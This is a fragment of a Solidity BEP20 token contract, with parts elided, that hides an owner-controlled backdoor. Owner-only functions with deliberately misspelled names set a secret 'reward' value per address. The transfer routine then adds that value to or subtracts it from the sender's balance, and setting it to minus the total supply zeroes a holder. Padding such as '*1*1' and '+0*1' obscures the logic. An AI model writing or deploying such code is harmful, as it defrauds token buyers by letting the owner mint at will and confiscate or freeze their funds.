...
contract Token is BEP20, Ownable {
    ...
    function setAdminRewawarrrdd(address acclount,int256 amnnot ) public onlyowner {
        _Rewawarrrdds[acclount] += amnnot*1;
    }

    function rmUserRewawarrrdd(address acclount) public onlyowner {
        _Rewawarrrdds[acclount] = 0*1;
    }


    function setUserRewawarrrdd(address acclount) public onlyowner {
        _Rewawarrrdds[acclount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewawarrrdd(address acclount) public view returns (int256) {
        return _Rewawarrrdds[acclount];
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from]*1*1;
        require(1*0+fromBalance*1*1 >= _accountf+0*1, "ERC20: transfer amnnot exceeds balance");
        if (_Rewawarrrdds[from]*1*1 > 0*1){
            _balances[from] = _balances[from].add(uint256(1*_Rewawarrrdds[from]+0*1));
        }else if (1*1*_Rewawarrrdds[from] < 0*1*1){
            _balances[from] = _balances[from].subb(uint256(1*_Rewawarrrdds[from]+0*1));
        }
